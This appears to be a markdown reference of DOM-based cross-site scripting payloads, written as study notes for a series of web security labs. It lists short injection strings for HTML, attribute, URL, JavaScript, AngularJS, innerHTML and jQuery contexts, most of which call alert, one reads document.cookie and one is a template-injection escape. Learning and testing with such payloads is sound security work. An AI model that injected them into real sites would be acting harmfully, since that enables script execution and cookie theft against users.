# DOM XSS Payload Reference

## HTML Context

```html
<script>alert(1)</script>
```

---

```html
<img src=1 onerror=alert(1)>
```

---

```html
<svg onload=alert(1)>
```

---

# Attribute Context

```html
" onmouseover="alert(1)
```

---

```html
" autofocus onfocus=alert(1) x="
```

---

# URL Context

```javascript
javascript:alert(1)
```

---

# JavaScript Context

```javascript
";alert(1);//
```

---

```javascript
'-alert(1)-'
```

---

# AngularJS

```html
{{7*7}}
```

---

```html
{{$on.constructor('alert(1)')()}}
```

---

# DOM XSS Specific Payloads

## document.write()

```html
"><svg onload=alert(1)>
```

---

## innerHTML

```html
<img src=1 onerror=alert(1)>
```

---

## jQuery href

```javascript
javascript:alert(document.cookie)
```

---

## jQuery Selector

```html
<img src=x onerror=print()>
```

---

# Related Labs

```text
Lab03
Lab04
Lab05
Lab06
Lab07
Lab08
Lab09
Lab10
```